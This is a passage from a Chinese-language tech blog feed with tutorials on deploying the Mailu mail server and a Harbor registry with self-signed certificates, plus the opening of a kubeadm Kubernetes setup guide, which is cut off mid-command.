    <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>mailu是一个运行在docker上的免费邮件服务器，易于安装，易于使用且易于维护。如果你想在Linux 上快速搭建邮箱服务器，mailu是一个不错的选择。</p><h3 id="一、安装docker和docker-compose"><a href="#一、安装docker和docker-compose" class="headerlink" title="一、安装docker和docker-compose"></a>一、安装docker和docker-compose</h3><p>相对简单，自行安装即可，可以看cicd专栏-kubeadm部署k8s中一键部署docker脚本。</p><h3 id="二、Mailu配置获取"><a href="#二、Mailu配置获取" class="headerlink" title="二、Mailu配置获取"></a>二、Mailu配置获取</h3><p>官方自动生成docker-compose.yaml文件。打开网站：<a href="https://setup.mailu.io/">Mailu setup</a></p><p>1.选择版本部署，这里直接选稳定版部署</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/65995692b474479fb92e8feeb53cb210.png" alt="65995692b474479fb92e8feeb53cb210.png"></p><p>2.设置路径与域名信息</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/57f9d80a5f6940abaacdafba57ad5fc4.png" alt="57f9d80a5f6940abaacdafba57ad5fc4.png"></p><p>3.选择网页邮箱的面板。这里可以选择Roundcube和Rainloop, 您可以根据个人偏好来选择，我这里选择Rainloop，Rainloop支持中文显示。下面的三个选项分别是杀毒、WebDAV、邮件代收，您可以根据自己的需要来勾选。服务器配置较低，不建议勾选杀毒服务，也就是第一个。配置很低，可以都不选择。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/701a8a0345974a6aa7096e3565bda783.png" alt="701a8a0345974a6aa7096e3565bda783.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>4.生成docker-compose配置文件</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/e1030edcd5c540e488e63d6056d97669.png" alt="e1030edcd5c540e488e63d6056d97669.png"></p><h3 id="三、部署"><a href="#三、部署" class="headerlink" title="三、部署"></a>三、部署</h3><p>参考链接：<a href="https://mailu.io/2.0/maintain.html">Maintain a Mailu server — Mailu, Docker based mail server</a></p><p>创建目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /mailu<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>进入目录下载配置文件</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs maxima">cd /mailu<br>wget https://setup.mailu.io/<span class="hljs-number">2024.06</span>/file/5837bbb1-<span class="hljs-number">92e6</span>-<span class="hljs-number">49b7</span>-be78-eb34396f59d8/docker-compose.yml<br>wget https://setup.mailu.io/<span class="hljs-number">2024.06</span>/file/5837bbb1-<span class="hljs-number">92e6</span>-<span class="hljs-number">49b7</span>-be78-eb34396f59d8/mailu.env<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /mailu<br>docker compose -p mailu up -d<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>创建账号和用户名</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">docker compose -p mailu <span class="hljs-keyword">exec</span> <span class="hljs-literal">admin</span> flask mailu <span class="hljs-literal">admin</span> <span class="hljs-literal">admin</span> cherry.com PASSWORD<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h3 id="四、Mailu的email相关配置"><a href="#四、Mailu的email相关配置" class="headerlink" title="四、Mailu的email相关配置"></a>四、Mailu的email相关配置</h3><p><strong>1.登录</strong></p><p>上面设置的admin账户，所有邮箱账户为<a href="mailto:admin@yunjiup.com">admin@cherry.com</a>，密码为PASSWORD，选择登录admin即可，以为还需要一些配置。webmail为网页版邮箱。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/8b8f3b1a7dbc4905898e2cd524e6a923.png" alt="8b8f3b1a7dbc4905898e2cd524e6a923.png"></p><p>2.<strong>查看DNS及生成密钥</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/4d8435c1c32e4e939833fb31ff7feefc.png" alt="4d8435c1c32e4e939833fb31ff7feefc.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>3.生成密钥</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/ea8c1a59936940ada46aa640a10c94ea.png" alt="ea8c1a59936940ada46aa640a10c94ea.png"></p><p>4.将生成信息在腾讯云上做dns解析</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/51a73434020bd45d6651356964c9b3d0.png" alt="51a73434020bd45d6651356964c9b3d0.png"></p><h3 id="五、测试"><a href="#五、测试" class="headerlink" title="五、测试"></a>五、测试</h3><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/e656e081bd5a41f8bb44ff5e41de053f.png" alt="e656e081bd5a41f8bb44ff5e41de053f.png"></p><h3 id="六、故障排查"><a href="#六、故障排查" class="headerlink" title="六、故障排查"></a>六、故障排查</h3><p>这里有个小坑，国内的阿里云服务器&#x2F;腾讯云服务器,出网端口25都把你给锁了,25端口不让你玩<del>一边凉快去</del>。所以当我们部署完成之后，我们自建的邮件服务只能接收邮件，不能发送邮件。</p><p>1.查看docker日志</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">root@VM-1-168-ubuntu:/mailu# docker logs -f mailu-smtp-1<br><span class="hljs-built_in">..</span>.<br>Mar 23 11:18:07 VM_175_210_centos postfix/pickup[28551]: 6F8A174556: <span class="hljs-attribute">uid</span>=0 <span class="hljs-attribute">from</span>=&lt;root&gt;<br>Mar 23 11:18:07 VM_175_210_centos postfix/cleanup[32639]: 6F8A174556: <span class="hljs-attribute">message-id</span>=&lt;20180323031807.6F8A174556@example.com&gt;<br>Mar 23 11:18:07 VM_175_210_centos postfix/qmgr[28550]: 6F8A174556: <span class="hljs-attribute">from</span>=&lt;root@example.com&gt;, <span class="hljs-attribute">size</span>=439, <span class="hljs-attribute">nrcpt</span>=1 (queue active)<br>Mar 23 11:18:29 VM_175_210_centos postfix/smtp[32456]: connect <span class="hljs-keyword">to</span> mx1.qq.com[183.57.48.35]:25:<span class="hljs-built_in"> Connection </span>timed out<br>Mar 23 11:18:29 VM_175_210_centos postfix/smtp[32456]: 792877454A: <span class="hljs-attribute">to</span>=&lt;491126240@qq.com&gt;, <span class="hljs-attribute">relay</span>=none, <span class="hljs-attribute">delay</span>=2579, <span class="hljs-attribute">delays</span>=2459/0.25/120/0, <span class="hljs-attribute">dsn</span>=4.4.1, <span class="hljs-attribute">status</span>=deferred (connect <span class="hljs-keyword">to</span> mx1.qq.com[183.57.48.35]:25:<span class="hljs-built_in"> Connection </span>timed out)<br>Mar 23 11:18:37 VM_175_210_centos postfix/smtp[32640]: connect <span class="hljs-keyword">to</span> mxbiz1.qq.com[163.177.89.176]:25:<span class="hljs-built_in"> Connection </span>timed out<br>Mar 23 11:19:07 VM_175_210_centos postfix/smtp[32640]: connect <span class="hljs-keyword">to</span> mxbiz1.qq.com[112.90.78.144]:25:<span class="hljs-built_in"> Connection </span>timed out<br>Mar 23 11:19:38 VM_175_210_centos postfix/smtp[32640]: connect <span class="hljs-keyword">to</span> mxbiz2.qq.com[112.90.78.144]:25:<span class="hljs-built_in"> Connection </span>timed out<br><span class="hljs-built_in">..</span>.<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>很明显，25端口被禁掉了，我们需要向云厂商申请解封端口，这是腾讯云官方文档：<a href="https://cloud.tencent.com/document/product/213/40436">云服务器 解封25端口-操作指南-文档中心-腾讯云</a></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/c74ce9be2f4e4c7caec2ed05f1958daf.png" alt="c74ce9be2f4e4c7caec2ed05f1958daf.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>2.购买dns增值服务</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/002acb11f0aa4c438313401999e5da23.png" alt="002acb11f0aa4c438313401999e5da23.png"></p><p>3.做反向解析</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/daa05cb8ba8246e3af37e0f924ab7438.png" alt="daa05cb8ba8246e3af37e0f924ab7438.png"></p><p>4.申请解封25端口</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/a9a70fee4d6b4b9782a8bee42eb1111b.png" alt="a9a70fee4d6b4b9782a8bee42eb1111b.png"></p><p>5.申请通过之后，这时候我们收发邮件都是可以的</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/6f0fd8e15c404fc68d2efe03806bf37d.png" alt="6f0fd8e15c404fc68d2efe03806bf37d.png"></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux中间件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>harbor部署</title>
    <link href="/2025/04/15/harbor%E9%83%A8%E7%BD%B2/"/>
    <url>/2025/04/15/harbor%E9%83%A8%E7%BD%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="一、安装docker"><a href="#一、安装docker" class="headerlink" title="一、安装docker"></a>一、安装docker</h3><p>这里我们直接使用docker脚本安装，关于脚本上一篇博文有写，感兴趣的朋友可以参考一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.部署docker和docker-compose <br>1.1 解压软件包<br>[root@harbor ~]# tar xf docker-docker-compose.tar.gz <br><br>1.2 安装docker和docker-compose运行时<br>[root@harbor ~]# ./install-docker.sh i<br><br>1.3 查看版本 <br>[root@harbor ~]# docker --version<br>Docker version 20.10.24, build 297e128<br>[root@harbor ~]# <br>[root@harbor ~]# docker-compose --version<br>Docker Compose version v2.23.0<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h3 id="二、安装harbor"><a href="#二、安装harbor" class="headerlink" title="二、安装harbor"></a><strong>二、安装harbor</strong></h3><h5 id="准备harbor安装包"><a href="#准备harbor安装包" class="headerlink" title="准备harbor安装包"></a><strong>准备harbor安装包</strong></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/goharbor/harbor/tags<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h5 id="创建证书的工作目录"><a href="#创建证书的工作目录" class="headerlink" title="创建证书的工作目录"></a>创建证书的工作目录</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@harbor ~]# <span class="hljs-built_in">mkdir</span> -pv /softwares/harbor/certs/&#123;ca,harbor-server,docker-client&#125;<br><span class="hljs-built_in">mkdir</span>: created directory <span class="hljs-string">&#x27;/softwares/harbor/certs&#x27;</span><br><span class="hljs-built_in">mkdir</span>: created directory <span class="hljs-string">&#x27;/softwares/harbor/certs/ca&#x27;</span>  <span class="hljs-comment"># 将来存储的是自建CA证书</span><br><span class="hljs-built_in">mkdir</span>: created directory <span class="hljs-string">&#x27;/softwares/harbor/certs/harbor-server&#x27;</span>  <span class="hljs-comment"># harbor服务端使用的证书</span><br><span class="hljs-built_in">mkdir</span>: created directory <span class="hljs-string">&#x27;/softwares/harbor/certs/docker-client&#x27;</span>  <span class="hljs-comment"># harbor客户端链接时使用的证书文件</span><br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h5 id="解压软件包"><a href="#解压软件包" class="headerlink" title="解压软件包"></a>解压软件包</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@harbor ~]# tar xf harbor-offline-installer-v2.7.4.tgz -C /softwares/<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h5 id="进入到harbor证书存放目录"><a href="#进入到harbor证书存放目录" class="headerlink" title="进入到harbor证书存放目录"></a>进入到harbor证书存放目录</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@harbor ~]# <span class="hljs-built_in">cd</span> /softwares/harbor/certs/<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h5 id="生成自建CA证书"><a href="#生成自建CA证书" class="headerlink" title="生成自建CA证书"></a>生成自建CA证书</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.创建CA的私钥<br>[root@harbor certs]# <span class="hljs-built_in">pwd</span><br>/softwares/harbor/certs<br>[root@harbor certs]# openssl genrsa -out ca/ca.key 4096<br><br>2 基于自建的CA私钥创建CA证书(注意，证书签发的域名范围)<br>[root@harbor certs]# openssl req -x509 -new -nodes -sha512 -days 3650 \<br> -subj <span class="hljs-string">&quot;/C=CN/ST=Beijing/L=Beijing/O=example/OU=Personal/CN=cherry.com&quot;</span> \<br> -key ca/ca.key \<br> -out ca/ca.crt<br><br>3 查看自建证书信息<br>[root@harbor certs]# openssl  x509 -<span class="hljs-keyword">in</span> ca/ca.crt -noout -text<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h5 id="配置harbor证书"><a href="#配置harbor证书" class="headerlink" title="配置harbor证书"></a>配置harbor证书</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.生成harbor服务器的私钥<br>[root@harbor certs]# openssl genrsa -out harbor-server/harbor.cherry.com.key 4096<br><br>2 harbor服务器基于私钥签发证书认证请求（csr文件），让自建CA认证<br>[root@harbor certs]# openssl req -sha512 -new \<br>    -subj <span class="hljs-string">&quot;/C=CN/ST=Beijing/L=Beijing/O=example/OU=Personal/CN=harbor.cherry.com&quot;</span> \<br>    -key harbor-server/harbor.cherry.com.key \<br>    -out harbor-server/harbor.cherry.com.csr<br>    <br>3 生成 x509 v3 的扩展文件用于认证<br><span class="hljs-built_in">cat</span> &gt; harbor-server/v3.ext &lt;&lt;-<span class="hljs-string">EOF</span><br><span class="hljs-string">authorityKeyIdentifier=keyid,issuer</span><br><span class="hljs-string">basicConstraints=CA:FALSE</span><br><span class="hljs-string">keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment</span><br><span class="hljs-string">extendedKeyUsage = serverAuth</span><br><span class="hljs-string">subjectAltName = @alt_names</span><br><span class="hljs-string"></span><br><span class="hljs-string">[alt_names]</span><br><span class="hljs-string">DNS.1=harbor.cherry.com</span><br><span class="hljs-string">EOF</span><br>             <br>4 基于 x509 v3 的扩展文件认证签发harbor server证书<br>[root@harbor certs]# openssl x509 -req -sha512 -days 3650 \<br>    -extfile harbor-server/v3.ext \<br>    -CA ca/ca.crt -CAkey ca/ca.key -CAcreateserial \<br>    -<span class="hljs-keyword">in</span> harbor-server/harbor.cherry.com.csr \<br>    -out harbor-server/harbor.cherry.com.crt<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h5 id="修改harbor的配置文件使用自建证书"><a href="#修改harbor的配置文件使用自建证书" class="headerlink" title="修改harbor的配置文件使用自建证书"></a>修改harbor的配置文件使用自建证书</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">注意所在路径<br>[root@harbor harbor]# <span class="hljs-built_in">pwd</span><br>/softwares/harbor<br><br>修改harbor的配置文件使用自建证书<br>[root@harbor harbor]# <span class="hljs-built_in">cp</span> harbor.yml&#123;.tmpl,&#125;<br><br>编辑harbor配置文件<br>[root@harbor harbor]# vim harbor.yml<br>...<br>hostname: harbor.cherry.com<br>https:<br>  ...<br>  certificate: /softwares/harbor/certs/harbor-server/harbor.cherry.com.crt<br>  private_key: /softwares/harbor/certs/harbor-server/harbor.cherry.com.key<br>...<br>harbor_admin_password: 1<br>...<br>data_volume: /data/harbor<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h5 id="安装harbor"><a href="#安装harbor" class="headerlink" title="安装harbor"></a>安装harbor</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@harbor harbor]# ./install.sh --with-chartmuseum<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h3 id="三、访问"><a href="#三、访问" class="headerlink" title="三、访问"></a>三、访问</h3><h5 id="Windows做hosts解析"><a href="#Windows做hosts解析" class="headerlink" title="Windows做hosts解析"></a>Windows做hosts解析</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">编辑Windowshosts文件<br>位置  C:\Windows\System32\drivers\etc\hosts<br>...<br>10.0.0.250 harbor.cherry.com<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h5 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://harbor.cherry.com<br><br>账号：admin<br>密码：1<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d7c3895e963d46c5afaf5f99865075d6.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>cicd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cicd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kubeadm 部署k8s</title>
    <link href="/2025/04/15/kubeadm-%E9%83%A8%E7%BD%B2k8s/"/>
    <url>/2025/04/15/kubeadm-%E9%83%A8%E7%BD%B2k8s/</url>
    
    <content type="html"><![CDATA[<h3 id="闲聊"><a href="#闲聊" class="headerlink" title="闲聊"></a>闲聊</h3><p>考虑了很久，打算写一篇保姆级部署从0-1构建企业级cicd流水线，把工作上面所用到的技术点分享给大家。从最k8s，harbor，jenkins，gitlab，docker的详细部署到集成。前后端流水线的构建，发布等…如果以下内容有不足的地方，请指出，我会第一时间更正。谢谢大家。</p><p>先上一下手绘导图，大致的流程图如下：<br>大致的部署流程是这样的：开发人员把做好的asp.net core项目代码通过git推送到gitlab，然后Jenkins通过 gitlab webhook （前提是配置好），自动从拉取gitlab上面拉取代码下来，然后进行build，编译、生成镜像、然后把镜像推送到Harbor仓库；然后在部署的时候通过k8s拉取Harbor上面的代码进行创建容器和服务，最终发布完成，然后可以用外网访问。<br><img src="https://i-blog.csdnimg.cn/img_convert/43ad043138325f26040323ea0ad0997c.png"></p><p>当然啦，上面只是粗略的，请看下图才更加形象。<br><img src="https://i-blog.csdnimg.cn/img_convert/bf1ac1d19937c32868663f22a7402571.png"></p><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>K8s 集群部署有多种方式，kubeadm 是 K8s 官方提供的集群部署工具，这种方法最为常用，简单快速，适合初学者。本文就使用 kubeadm 搭建集群演示。</p><h3 id="二、主机准备"><a href="#二、主机准备" class="headerlink" title="二、主机准备"></a>二、主机准备</h3><p>本次我们搭建一套 3 个节点的 K8s 集群，操作系统使用Ubuntu 22.04.4 LTS，配置2核4G，ip规划如下</p><table><thead><tr><th>主机名</th><th>ip地址</th><th><strong>主机配置</strong></th></tr></thead><tbody><tr><td>master231</td><td>10.0.0.231</td><td>2核，4GiB，系统盘 20GiB</td></tr><tr><td>worker232</td><td>10.0.0.232</td><td>2核，4GiB，系统盘 20GiB</td></tr><tr><td>worker233</td><td>10.0.0.233</td><td>2核，4GiB，系统盘 20GiB</td></tr></tbody></table><h3 id="三、系统配置"><a href="#三、系统配置" class="headerlink" title="三、系统配置"></a>三、系统配置</h3><h5 id="关闭swap分区"><a href="#关闭swap分区" class="headerlink" title="关闭swap分区"></a>关闭swap分区</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">swapoff -a &amp;&amp; sysctl -w vm.swappiness=0  <span class="hljs-comment"># 临时关闭</span><br>sed -ri <span class="hljs-string">&#x27;/^[^#]*swap/s@^@#@&#x27;</span> /etc/fstab  <span class="hljs-comment"># 基于配置文件关闭</span><br></code></pre></td></tr></table></figure><h5 id="确保各个节点MAC地址或product-uuid唯一"><a href="#确保各个节点MAC地址或product-uuid唯一" class="headerlink" title="确保各个节点MAC地址或product_uuid唯一"></a>确保各个节点MAC地址或product_uuid唯一</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig  ens33  | grep ether | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span><br><span class="hljs-built_in">cat</span> /sys/class/dmi/id/product_uuid <br><br>温馨提示:<br>   一般来讲，硬件设备会拥有唯一的地址，但是有些虚拟机的地址可能会重复。 <br>   Kubernetes使用这些值来唯一确定集群中的节点。 如果这些值在每个节点上不唯一，可能会导致安装失败。<br></code></pre></td></tr></table></figure><h5 id="检查网络节点是否互通"><a href="#检查网络节点是否互通" class="headerlink" title="检查网络节点是否互通"></a>检查网络节点是否互通</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">简而言之，就是检查你的k8s集群各节点是否互通，可以使用ping命令来测试。<br>ping www.baidu.com -c 10<br>ping master231 -c 10<br></code></pre></td></tr></table></figure><h5 id="允许iptable检查桥接流量"><a href="#允许iptable检查桥接流量" class="headerlink" title="允许iptable检查桥接流量"></a>允许iptable检查桥接流量</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF | tee /etc/modules-load.d/k8s.conf</span><br><span class="hljs-string">br_netfilter</span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF | tee /etc/sysctl.d/k8s.conf</span><br><span class="hljs-string">net.bridge.bridge-nf-call-ip6tables = 1</span><br><span class="hljs-string">net.bridge.bridge-nf-call-iptables = 1</span><br><span class="hljs-string">net.ipv4.ip_forward = 1</span><br><span class="hljs-string">EOF</span><br><br>sysctl --system<br></code></pre></td></tr></table></figure><h5 id="修改cgroup的管理进程"><a href="#修改cgroup的管理进程" class="headerlink" title="修改cgroup的管理进程"></a>修改cgroup的管理进程</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">所有节点修改cgroup的管理进程为systemd==乌班图默认不用修改<br>[root@master231 ~]# docker info  | grep <span class="hljs-string">&quot;Cgroup Driver:&quot;</span><br> Cgroup Driver: systemd<br>[root@master231 ~]# <br><br>[root@worker232 ~]# docker info  | grep <span class="hljs-string">&quot;Cgroup Driver:&quot;</span><br> Cgroup Driver: systemd<br>[root@worker232 ~]# <br><br>[root@worker233 ~]# docker info  | grep <span class="hljs-string">&quot;Cgroup Driver:&quot;</span><br> Cgroup Driver: systemd<br>[root@worker233 ~]# <br>温馨提示:<br>如果不修改cgroup的管理驱动为systemd，则默认值为cgroupfs，在初始化master节点时会失败<br></code></pre></td></tr></table></figure><h3 id="四、安装k8s管理工具"><a href="#四、安装k8s管理工具" class="headerlink" title="四、安装k8s管理工具"></a>四、安装k8s管理工具</h3><p>kubeadm：用来初始化K8S集群的工具。<br>kubelet：在集群中的每个节点上用来启动Pod和容器等。<br>kubectl：用来与K8S集群通信的命令行工具。</p><h5 id="所有节点操作"><a href="#所有节点操作" class="headerlink" title="所有节点操作"></a><strong>所有节点操作</strong></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.K8S所有节点配置软件源<br>apt-get update &amp;&amp; apt-get install -y apt-transport-https<br>curl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | apt-key add - <br><span class="hljs-built_in">cat</span> 